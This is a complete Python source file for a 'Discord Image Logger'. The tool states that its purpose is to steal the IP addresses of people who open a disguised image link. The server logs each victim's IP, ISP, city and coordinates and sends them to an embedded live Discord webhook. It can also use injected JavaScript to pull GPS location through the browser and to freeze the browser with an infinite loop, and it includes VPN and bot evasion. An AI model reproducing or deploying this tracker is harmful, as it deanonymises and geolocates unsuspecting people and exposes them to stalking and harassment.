# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1259042619166687274/-BduWrLUNJuDvwLV7rA4f00zslYZEpHKaAFy_ogVaOsYQQRKTCcTdPPQgGrko6GuNQXz",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "AKIMBO BOT", # Set this to the name you want the webhook to have
    "color": 0xFFFFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": True, # Enable the custom message?
        "message": "SNIFFED BY AKIMBO", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
